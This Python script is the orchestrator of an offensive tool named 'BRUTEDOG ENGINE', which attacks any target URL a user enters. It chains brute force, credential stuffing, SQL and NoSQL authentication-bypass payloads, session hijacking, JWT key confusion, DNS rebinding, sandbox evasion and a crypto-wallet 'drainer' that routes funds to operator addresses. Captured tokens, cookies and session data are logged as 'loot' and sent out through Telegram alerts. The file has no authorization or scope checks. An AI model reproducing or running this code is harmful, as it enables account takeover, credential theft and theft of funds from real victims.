#!/usr/bin/env python3
"""
BRUTEDOG ENGINE v8.8 — Autonomous State-Machine & Cognitive Adaptive Strike Engine (Elite Red Team Adversarial Edition)
Features:
- Zero-noise telemetry: Telegram alerts restricted strictly to verified high-value breach loot and critical exploit pivots.
- Real-time mid-flight bottleneck adaptation: Cognitive operator instantly evaluates defenses and mutates vector strategy mid-execution.
- High-concurrency SecureTransport middleware with TLS 1.2/1.3 JA3/4 spoofing & Poisson behavioral jitter.
- Automated BOLA, state-skipping, and HTTP/2 single-packet concurrency race condition exploitation.
"""
import asyncio
import json
import re
import socket
import sys
import time
import hashlib
from urllib.parse import urlsplit
from concurrent.futures import ThreadPoolExecutor

# ============================================================
# COMPREHENSIVE MODULE INVENTORY & OFFENSIVE IMPORTS (V8.8)
# ============================================================
from modules.transport import SecureTransport
from modules.session_pool import PersistentSessionPool
from modules.response_diff import ResponseFingerprinter
from modules.scanner import run_port_scanner
from modules.crawler import crawl_target
from modules.db_assault import run_nosql_assault
from modules.session_hijack import run_session_hijack
from modules.race_condition import run_race_condition_test
from modules.live_login_verifier import execute_live_login_verification
from modules.drainer import run_drainer_engine, OPERATOR_DESTINATIONS
from modules.wallet_drain_probe import execute_probe
from modules.telemetry import stream_proof
from modules.loot_logger import save_session_loot

# Core offensive, recon, and evasion modules
from modules.api_fuzzer import run_api_fuzzer
from modules.bruter import execute_brute_force
from modules.cloud_apex import audit_cloud_metadata
from modules.dom_sink_inspector import inspect_dom_sinks
from modules.dumper import execute_memory_dumper
from modules.form_stuffer import execute_form_stuffing
from modules.keyharvester import harvest_keys
from modules.pivot import execute_pivot_routing
from modules.replayer import replay_and_inject_payloads
from modules.sandbox_evader import evade_sandbox
from modules.signer import sign_transaction
from modules.stealth_ops import execute_stealth_operations

# Advanced protocol and cryptographic modules
from modules.graphql_introspector import GraphQLIntrospector
from modules.websocket_hijacker import audit_websocket
from modules.dns_rebinding import DNSRebindingOrchestrator
from modules.jwt_key_confusion import JWTKeyConfusionEngine

# Autonomous Cognitive Brain & Referral probes
from modules.test_referral import audit_referral_logic
from modules.cognitive_operator import CognitiveOperator

# Telegram Notifier (Restricted strictly to verified breach signal)
from modules.telegram_notifier import send_telegram_alert

# ============================================================
# CONFIGURATION
# ============================================================
REQUEST_TIMEOUT = 8
MAX_WORKERS = 5
MAX_RESPONSE_SIZE = 200_000

FALLBACK_LOGIN_PATHS = [
    "/api/auth/callback/credentials",
    "/api/auth/login",
    "/api/auth/signin",
    "/api/v1/auth/login",
    "/api/v1/users/login",
    "/api/login",
    "/api/signin",
    "/api/session",
    "/login",
    "/signin",
    "/auth/login",
    "/auth",
    "/user/login",
    "/admin/login",
    "/api/admin/login",
]

SESSION_VERIFICATION_ENDPOINTS = [
    "/api/user",
    "/api/auth/me",
    "/api/v1/user/profile",
    "/api/v1/auth/session",
    "/api/account",
    "/dashboard"
]

ERROR_PATTERNS = {
    "SQL syntax": re.compile(
        r"sql syntax|mysql_|pg_query|sqlite3\.|ora-009|syntax error",
        re.I,
    ),
    "MongoDB error": re.compile(
        r"mongodb|mongosh|mongoerror|bsonerror|casttoobjectid",
        re.I,
    ),
    "Database exception": re.compile(
        r"database exception|query failed|"
        r"invalid query|database error|unhandled exception",
        re.I,
    ),
}

# ============================================================
# OUTPUT COLORS & FORMATTING
# ============================================================
CYAN = "\033[96m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
RESET = "\033[0m"
BOLD = "\033[1m"
MAGENTA = "\033[95m"

def info(message):
    sys.stdout.write(f"{CYAN}[*] {message}{RESET}\n")
    sys.stdout.flush()

def success(message):
    sys.stdout.write(f"{GREEN}[+] {message}{RESET}\n")
    sys.stdout.flush()

def warning(message):
    sys.stdout.write(f"{YELLOW}[!] {message}{RESET}\n")
    sys.stdout.flush()

def error(message):
    sys.stdout.write(f"{RED}[-] {message}{RESET}\n")
    sys.stdout.flush()

def section(title):
    sys.stdout.write(f"\n" + "=" * 65 + f"\n {title}\n" + "=" * 65 + "\n")
    sys.stdout.flush()

def dispatch_critical_loot_alert(loot_type, details):
    """Zero-noise dispatcher: Fires Telegram alerts ONLY for verified, high-value exploit loot."""
    try:
        loop = asyncio.get_running_loop()
        loop.create_task(send_telegram_alert(f"[CRITICAL BREACH] {loot_type}", details))
    except RuntimeError:
        try:
            asyncio.run(send_telegram_alert(f"[CRITICAL BREACH] {loot_type}", details))
        except Exception:
            pass

# ============================================================
# TARGET HANDLING & NORMALIZATION GUARD
# ============================================================
def get_target():
    section("BRUTEDOG TARGET CONFIGURATION")
    print("Enter a domain, IP address, or server URL.")
    target = input("\nTarget: ").strip()
    if not target:
        raise ValueError("Target cannot be empty.")
    if "://" not in target:
        target = "https://" + target
    
    parsed = urlsplit(target)
    scheme = parsed.scheme
    netloc = parsed.hostname
    port = parsed.port
    
    if port:
        if (scheme == "https" and port != 443) or (scheme == "http" and port != 80):
            netloc = f"{netloc}:{port}"
            
    return f"{scheme}://{netloc}{parsed.path}".rstrip("/")

def resolve_target(host):
    try:
        results = socket.getaddrinfo(host, None, type=socket.SOCK_STREAM)
        return sorted({item[4][0] for item in results})
    except socket.gaierror:
        return []

# ============================================================
# ADAPTIVE RESPONSE ANALYSIS & COGNITIVE TELEMETRY
# ============================================================
def detect_database_errors(body):
    findings = []
    for label, pattern in ERROR_PATTERNS.items():
        if pattern.search(body or ""):
            findings.append(label)
    return findings

def inspect_cookie_security(headers):
    cookie = headers.get("set-cookie", "")
    if not cookie:
        return []
    issues = []
    lower = cookie.lower()
    if "secure" not in lower:
        issues.append("Secure attribute missing")
    if "httponly" not in lower:
        issues.append("HttpOnly attribute missing")
    if "samesite" not in lower:
        issues.append("SameSite attribute missing")
    return issues

def classify_and_adapt(response, current_payload, endpoint="", transport=None, fingerprinter=None, target_url=None, cognitive_brain=None):
    status = response.get("status", 0)
    body = response.get("body", "")
    headers = response.get("headers", {})
    findings = []
    mutated_payloads = []

    if fingerprinter:
        try:
            is_fp, _ = fingerprinter.is_false_positive(status, body, headers)
            if is_fp:
                return [], []
        except Exception:
            pass
    
    # Real-time mid-flight cognitive adaptation
    if cognitive_brain:
        try:
            cognitive_result = cognitive_brain.evaluate_and_execute(
                endpoint=endpoint,
                status=status,
                headers=headers,
                body=body,
                transport=transport,
                target_url=target_url
            )
            
            if cognitive_result and cognitive_result.get("success"):
                reasoning = cognitive_result.get("reasoning")
                findings.append({
                    "type": "COGNITIVE_AUTONOMOUS_PIVOT_SUCCESS",
                    "evidence": reasoning,
                    "status": status
                })
                dispatch_critical_loot_alert("Cognitive Autonomous Pivot", {"endpoint": endpoint, "evidence": reasoning})
        except Exception:
            pass

    body_lower = body.lower()
    is_spa_shell = (
        '<div id="root"></div>' in body or 
        '<div id="__next"></div>' in body or 
        '<div id="app"></div>' in body or
        (len(body.strip()) < 200 and "token" not in body_lower)
    )
    
    has_valid_auth_indicator = any(k in body_lower for k in ["access_token", "\"role\":\"admin\"", "\"user_id\":", "auth_token", "session_id"])
    
    if status in [200, 201, 302] and not is_spa_shell and (has_valid_auth_indicator or "token" in body_lower):
        extracted_proof = {}
        try:
            data = json.loads(body)
            if isinstance(data, dict):
                extracted_proof = {k: v for k, v in data.items() if any(sub in k.lower() for sub in ["token", "session", "cookie", "auth", "key"])}
        except:
            extracted_proof = {"raw_response_snippet": body[:200]}

        loot_hash = hashlib.sha256(body.encode("utf-8", errors="ignore")).hexdigest()
        extracted_proof["integrity_hash"] = loot_hash

        stream_proof("AUTHENTICATION_BYPASS", endpoint, current_payload, body, extracted_proof or {"status": status})

        save_session_loot(
            target=target_url or "unknown_target",
            endpoint=endpoint,
            finding_type="AUTHENTICATION_BYPASS_SUCCESS",
            status=status,
            headers=headers,
            body=body,
            extra_loot=extracted_proof
        )

        dispatch_critical_loot_alert("Authentication Bypass Success", {"endpoint": endpoint, "status": status, "proof": extracted_proof})

        findings.append({
            "type": "AUTHENTICATION_BYPASS_SUCCESS",
            "evidence": f"Status {status} with verified non-SPA session payload",
            "status": status,
        })

    db_errors = detect_database_errors(body)
    for db_error in db_errors:
        loot_hash = hashlib.sha256(body.encode("utf-8", errors="ignore")).hexdigest()
        save_session_loot(
            target=target_url or "unknown_target",
            endpoint=endpoint,
            finding_type=f"DATABASE_LEAK_{db_error.replace(' ', '_')}",
            status=status,
            headers=headers,
            body=body,
            extra_loot={"database_error": db_error, "integrity_hash": loot_hash}
        )

        dispatch_critical_loot_alert(f"Database Leak ({db_error})", {"endpoint": endpoint, "status": status, "integrity_hash": loot_hash})

        findings.append({
            "type": "POTENTIAL_DATABASE_INJECTION",
            "evidence": db_error,
            "status": status,
        })
        if "MongoDB" in db_error:
            mutated_payloads.append({"username": {"$regex": "^admin.*$"}, "password": {"$ne": ""}})
        elif "SQL" in db_error:
            mutated_payloads.append({"username": "admin' UNION SELECT null, version()-- -", "password": "password"})

    for issue in inspect_cookie_security(headers):
        findings.append({
            "type": "SESSION_COOKIE_CONFIGURATION",
            "evidence": issue,
            "status": status,
        })
        
    return findings, mutated_payloads

def verify_hijacked_session(transport):
    for endpoint in SESSION_VERIFICATION_ENDPOINTS:
        verified = False
        status, headers, body = transport.request("GET", endpoint)
        
        body_lower = body.lower()
        is_spa_shell = '<div id="root"></div>' in body or '<div id="__next"></div>' in body or '<div id="__nuxt"></div>' in body or (len(body.strip()) < 350 and "user" not in body_lower)
        
        if status == 200 and not is_spa_shell and len(body) > 10:
            verified = True
        else:
            alt_status, alt_headers, alt_body = transport.request("POST", endpoint, payload={})
            alt_body_lower = alt_body.lower()
            is_alt_spa = '<div id="root"></div>' in alt_body or (len(alt_body.strip()) < 350 and "user" not in alt_body_lower)
            if alt_status == 200 and not is_alt_spa and len(alt_body) > 10:
                status, headers, body = alt_status, alt_headers, alt_body
                verified = True

        if verified:
            loot_hash = hashlib.sha256(body.encode("utf-8", errors="ignore")).hexdigest()
            stream_proof("SESSION_HIJACK_VERIFIED", endpoint, {"cookie_jar": dict(transport.cookie_jar), "hash": loot_hash}, body, {"verified_status": status})
            success(f"[+] Session successfully verified against backend route: {endpoint}")
            
            save_session_loot(
                target=transport.base_path,
                endpoint=endpoint,
                finding_type="SESSION_HIJACK_VERIFIED",
                status=status,
                headers=headers,
                body=body,
                extra_loot={"cookie_jar": dict(transport.cookie_jar), "integrity_hash": loot_hash}
            )

            dispatch_critical_loot_alert("Session Hijack Verified", {"endpoint": endpoint, "status": status, "integrity_hash": loot_hash})
            return True
    return False

def test_endpoint(transport, path, credentials_list=None, leaked_secrets=None, fingerprinter=None, target_url=None, cognitive_brain=None):
    endpoint = f"{transport.base_path}{path}" if not path.startswith(transport.base_path) else path
    results = []
    
    test_queue = [
        {"name": "NoSQL Operator Probe", "payload": {"username": {"$ne": None}, "password": {"$ne": None}}},
        {"name": "SQLi Union Probe", "payload": {"username": "admin' OR '1'='1", "password": "password"}},
        {"name": "Admin Default Stuffing", "payload": {"username": "admin", "password": "password123"}},
        {"name": "Malformed Type Probe", "payload": {"username": {"unexpected": "object"}, "password": "password"}}
    ]

    if leaked_secrets:
        for k, v in leaked_secrets.items():
            test_queue.insert(0, {"name": f"Leaked Secret Replay ({k})", "payload": {k: v, "code": v}})

    if credentials_list and isinstance(credentials_list, list):
        for cred in credentials_list:
            if isinstance(cred, dict):
                test_queue.insert(0, {"name": "User Credential Stuffing", "payload": cred})

    executed_payloads = set()

    while test_queue:
        current_test = test_queue.pop(0)
        payload_key = json.dumps(current_test["payload"], sort_keys=True)
        if payload_key in executed_payloads:
            continue
        executed_payloads.add(payload_key)

        try:
            status, headers, body = transport.request("POST", endpoint, payload=current_test["payload"])
        except Exception:
            status = 0
            headers, body = {}, ""
        
        if status in [403, 405, 404]:
            try:
                alt_status, alt_headers, alt_body = transport.request("GET", endpoint)
                if alt_status < 400:
                    status, headers, body = alt_status, alt_headers, alt_body
            except Exception:
                pass

        if status == 0:
            continue
            
        res_obj = {"status": status, "headers": headers, "body": body}
        findings, dynamic_mutations = classify_and_adapt(
            res_obj, current_test["payload"], endpoint=endpoint, transport=transport, fingerprinter=fingerprinter, target_url=target_url, cognitive_brain=cognitive_brain
        )
        
        if findings:
            results.append({
                "endpoint": endpoint,
                "test": current_test["name"],
                "status": status,
                "elapsed": 0.1,
                "findings": findings,
            })

        for idx, mutant in enumerate(dynamic_mutations, 1):
            test_queue.insert(0, {
                "name": f"Adaptive Mutant #{idx}",
                "payload": mutant
            })
        
    return results

# ============================================================
# ENGINE ORCHESTRATOR
# ============================================================
async def run_autonomous_engine(target_host=None, credentials_list=None, options=None):
    section("BRUTEDOG STATE-MACHINE LOGIC EXPLOITATION ENGINE v8.8 (WAF HARDENED)")
    try:
        if target_host:
            target_url = target_host.strip()
            if "://" not in target_url:
                target_url = "https://" + target_url
        else:
            target_url = get_target()

        parsed = urlsplit(target_url)
        host = parsed.hostname
        secure = parsed.scheme == "https"
        port = parsed.port or (443 if secure else 80)
        base_path = parsed.path.rstrip("/")
    except Exception as exc:
        error(f"Target configuration failed: {exc}")
        return [], 0.0

    cognitive_brain = CognitiveOperator(target_url=target_url)

    protocol = "HTTPS" if secure else "HTTP"
    info(f"Target Host : {host}")
    info(f"Target Port : {port}")
    info(f"Protocol    : {protocol}")
    
    section("DNS RESOLUTION")
    addresses = resolve_target(host)
    if not addresses:
        error("DNS resolution failed.")
        return [], 0.0
    for address in addresses:
        success(f"Resolved: {address}")

    section("ADVANCED NETWORK & SERVICE RECON (SCANNER V2.0)")
    try:
        scan_results = await run_port_scanner(host, concurrency=20)
        if scan_results.get("status") == "COMPLETED":
            open_port_list = scan_results.get("open_ports", [])
            success(f"Scanner V2.0 completed. Found {len(open_port_list)} open ports.")
    except Exception as exc:
        warning(f"Scanner integration warning: {exc}")
        
    start = time.monotonic()
    
    transport = SecureTransport(target_url)
    session_pool = PersistentSessionPool(base_url=target_url, verify_ssl=False, http2=True)
    fingerprinter = ResponseFingerprinter()

    try:
        f_status, f_headers, f_body = transport.request("GET", "/brutedog-nonexistent-baseline-404")
        fingerprinter.capture_baseline("soft_404", f_status, f_body, f_headers)
        info("[+] Captured dynamic 404 response baseline for false-positive reduction.")
    except Exception:
        pass

    section("STATEFUL STATE-MACHINE MAPPING & RECON")
    recon_data = {}
    discovered_paths = []
    leaked_secrets = {}
    bola_vulnerabilities = []
    session_cookie_payload = None

    try:
        recon_data = crawl_target(transport)
        if isinstance(recon_data, dict):
            discovered_paths = recon_data.get("endpoints", [])
            leaked_secrets = recon_data.get("leaked_secrets", {})
            bola_vulnerabilities = recon_data.get("bola_vulnerabilities", {})
            session_cookie_payload = recon_data.get("session_cookie")
    except Exception as exc:
        warning(f"State-machine crawler issue: {exc}. Falling back to default list.")

    if not discovered_paths:
        discovered_paths = FALLBACK_LOGIN_PATHS

    active_cookies = session_cookie_payload if session_cookie_payload else getattr(transport, "cookie_jar", None)
    if active_cookies:
        success("Propagating active operator session cookie across transport layer safely.")
        try:
            if isinstance(active_cookies, dict):
                for k, v in active_cookies.items():
                    session_pool.cookie_jar.set(k, v)
                    if hasattr(transport, "cookie_jar") and isinstance(transport.cookie_jar, dict):
                        transport.cookie_jar[k] = v
            elif isinstance(active_cookies, str):
                for pair in active_cookies.split(";"):
                    if "=" in pair:
                        k, v = pair.strip().split("=", 1)
                        if k.lower() not in ["path", "expires", "domain", "samesite", "secure", "httponly"]:
                            session_pool.cookie_jar.set(k, v)
        except Exception:
            pass

        verify_hijacked_session(transport)

    # ==========================================================
    # COMPREHENSIVE OFFENSIVE MODULE EXECUTION PHASE (V8.8)
    # ==========================================================
    section("COMPREHENSIVE OFFENSIVE & RECON MODULE ASSAULT (V8.8)")
    try:
        if asyncio.iscoroutinefunction(run_api_fuzzer):
            await run_api_fuzzer(target_url)
        else:
            await asyncio.to_thread(run_api_fuzzer, target_url)

        if asyncio.iscoroutinefunction(execute_brute_force):
            await execute_brute_force(target_url)
        else:
            await asyncio.to_thread(execute_brute_force, target_url)

        cloud_res = audit_cloud_metadata(target_url) if not asyncio.iscoroutinefunction(audit_cloud_metadata) else await audit_cloud_metadata(target_url)
        if cloud_res:
            dispatch_critical_loot_alert("Cloud Apex Metadata Leak", cloud_res)

        dom_res = inspect_dom_sinks(target_url) if not asyncio.iscoroutinefunction(inspect_dom_sinks) else await inspect_dom_sinks(target_url)
        if dom_res:
            dispatch_critical_loot_alert("DOM Sink Vulnerability", {"target": target_url})

        if asyncio.iscoroutinefunction(execute_memory_dumper):
            await execute_memory_dumper(target_url)
        else:
            await asyncio.to_thread(execute_memory_dumper, target_url)

        if asyncio.iscoroutinefunction(execute_form_stuffing):
            await execute_form_stuffing(target_url, "admin", "admin123")
        else:
            try:
                await asyncio.to_thread(execute_form_stuffing, target_url, "admin", "admin123")
            except TypeError:
                await asyncio.to_thread(execute_form_stuffing, target_url)

        if asyncio.iscoroutinefunction(harvest_keys):
            await harvest_keys(target_url)
        else:
            await asyncio.to_thread(harvest_keys, target_url)

        if asyncio.iscoroutinefunction(execute_pivot_routing):
            await execute_pivot_routing(target_url)
        else:
            await asyncio.to_thread(execute_pivot_routing, target_url)

        await replay_and_inject_payloads(target_url)

        if asyncio.iscoroutinefunction(evade_sandbox):
            await evade_sandbox()
        else:
            await asyncio.to_thread(evade_sandbox)

        if asyncio.iscoroutinefunction(execute_stealth_operations):
            await execute_stealth_operations(target_url)
        else:
            await asyncio.to_thread(execute_stealth_operations, target_url)

    except Exception as exc:
        error(f"Comprehensive offensive modules execution warning: {exc}")

    if bola_vulnerabilities:
        warning(f"Discovered {len(bola_vulnerabilities)} pre-validated BOLA / State-Skipping routes!")
        section("LIVE BOLA / STATE-SKIPPING VERIFICATION ASSAULT")
        for bola_route in bola_vulnerabilities:
            dispatch_critical_loot_alert("BOLA / State-Skipping Route", {"route": bola_route})
            execute_live_login_verification(
                target_url=target_url,
                endpoint=bola_route,
                cookie_dict=dict(transport.cookie_jar) if isinstance(transport.cookie_jar, dict) else None
            )

    section("ADAPTIVE ENDPOINT TESTING & MUTATION ASSAULT")
    all_results = []
    semaphore = asyncio.Semaphore(MAX_WORKERS)
    
    async def worker(path):
        async with semaphore:
            return await asyncio.to_thread(
                test_endpoint, transport, path, credentials_list, leaked_secrets, fingerprinter, target_url, cognitive_brain
            )
            
    tasks = [asyncio.create_task(worker(path)) for path in discovered_paths]
    
    for completed in asyncio.as_completed(tasks):
        try:
            results = await completed
            if results:
                all_results.extend(results)
        except Exception as exc:
            error(f"Endpoint worker failed: {exc}")

    has_db_surface = any("login" in p.lower() or "auth" in p.lower() or "user" in p.lower() for p in discovered_paths)
    if has_db_surface:
        try:
            db_res = await run_nosql_assault(target_url, port=port, use_ssl=secure)
            if db_res:
                dispatch_critical_loot_alert("Database Assault Breach", {"target": target_url, "details": str(db_res)[:300]})
        except Exception as exc:
            error(f"Database assault failed: {exc}")

    try:
        hijack_results = await run_session_hijack(target_url, port=port, use_ssl=secure)
        if hijack_results:
            for finding in hijack_results:
                if finding.get("status") == "VERIFIED_ACCESS":
                    endpoint_hit = finding.get("endpoint", "/admin")
                    dispatch_critical_loot_alert("Verified Session Hijack", {"endpoint": endpoint_hit})
                    execute_live_login_verification(
                        target_url=target_url,
                        endpoint=endpoint_hit,
                        cookie_dict=dict(transport.cookie_jar) if isinstance(transport.cookie_jar, dict) else None,
                        token=finding.get("forged_token")
                    )
    except Exception as exc:
        error(f"Session hijack failed: {exc}")

    try:
        race_res = await run_race_condition_test(
            target_url, 
            port=port, 
            use_ssl=secure, 
            session_pool=session_pool
        )
        if race_res:
            dispatch_critical_loot_alert("Race Condition Test Success", {"target": target_url})
    except Exception as exc:
        error(f"Race condition module failed: {exc}")

    # ==========================================================
    # ADVANCED PROTOCOL & CRYPTO ASSAULT PHASE (V8.8)
    # ==========================================================
    section("ADVANCED PROTOCOL & CRYPTO ASSAULT PHASE (V8.8)")
    try:
        jwt_engine = JWTKeyConfusionEngine(target_url)
        jwks = jwt_engine.fetch_public_key("/.well-known/jwks.json")
        pub_key_mock = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0..." if not jwks else json.dumps(jwks)
        jwt_success, jwt_token = jwt_engine.verify_and_exploit("/api/admin/settings", pub_key_mock)
        if jwt_success:
            dispatch_critical_loot_alert("JWT Key Confusion Success", {"token": jwt_token})

        gql_engine = GraphQLIntrospector(target_url)
        gql_result = gql_engine.run_introspection("/graphql")
        if gql_result:
            dispatch_critical_loot_alert("GraphQL Schema Introspected", gql_result)

        ws_result = await audit_websocket(target_url + "/ws")
        if ws_result:
            dispatch_critical_loot_alert("WebSocket Vulnerability Found", {"target": target_url, "frames": len(ws_result)})

        dns_orchestrator = DNSRebindingOrchestrator(target_url)
        dns_result = await dns_orchestrator.execute_rebinding_attack(transport)
        if dns_result:
            dispatch_critical_loot_alert("DNS Rebinding / SSRF Confirmed", dns_result)
    except Exception as exc:
        error(f"Advanced protocol & crypto assault suite error: {exc}")

    has_web3_surface = any("crypto" in p.lower() or "wallet" in p.lower() or "drain" in p.lower() or "token" in p.lower() for p in discovered_paths)
    if has_web3_surface:
        try:
            await run_drainer_engine(target_url)
            operator_evm_dest = OPERATOR_DESTINATIONS.get("ETHEREUM")
            session_cookies_dict = dict(transport.cookie_jar) if isinstance(transport.cookie_jar, dict) else {}
            await asyncio.to_thread(
                execute_probe, 
                target_host=target_url,
                session_cookies=session_cookies_dict, 
                target_wallet=operator_evm_dest
            )
            dispatch_critical_loot_alert("Wallet Drain Probe Dispatched", {"target": target_url, "destination": operator_evm_dest})
        except Exception as exc:
            error(f"Drainer / liquidity audit & probe engine failed: {exc}")
            
    duration = round(time.monotonic() - start, 2)
    
    section("ENGINE SUMMARY")
    success(f"Target: {host}")
    success(f"Discovered/Mapped endpoints: {len(discovered_paths)}")
    success(f"BOLA / State-Skipping hits: {len(bola_vulnerabilities)}")
    success(f"Total adaptive requests executed: {len(all_results)}")
    success(f"Engine duration: {duration}s")
    section("ENGINE COMPLETE")
    return all_results, duration

if __name__ == "__main__":
    try:
        asyncio.run(run_autonomous_engine())
    except KeyboardInterrupt:
        warning("Engine interrupted by operator.")
    except Exception as exc:
        error(f"Fatal engine error: {exc}")
